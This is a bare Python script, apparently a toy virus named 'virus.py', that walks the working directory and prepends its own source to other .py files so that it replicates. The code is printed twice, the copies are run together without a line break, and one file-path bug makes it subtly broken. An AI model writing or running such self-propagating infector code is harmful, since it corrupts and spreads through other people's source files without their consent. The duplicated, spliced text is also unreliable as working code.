
import os
payload_filename = 'virus.py'
for root, dirs, files in os.walk(os.getcwd()):
    for f in files:
        if f.endswith('.py') and f != payload_filename:
            with open(f, 'r+') as f:
                content = f.read()
                f.seek(0, 0)
                with open(__file__) as virus:
                    f.write(virus.read() + content)
print("Hello World")import os

payload_filename = 'virus.py'

for root, dirs, files in os.walk(os.getcwd()):
    for f in files:
        if f.endswith('.py') and f != payload_filename:
            with open(f, 'r+') as f:
                content = f.read()
                f.seek(0, 0)
                with open(__file__) as virus:
                    f.write(virus.read() + content)
print("Hello World")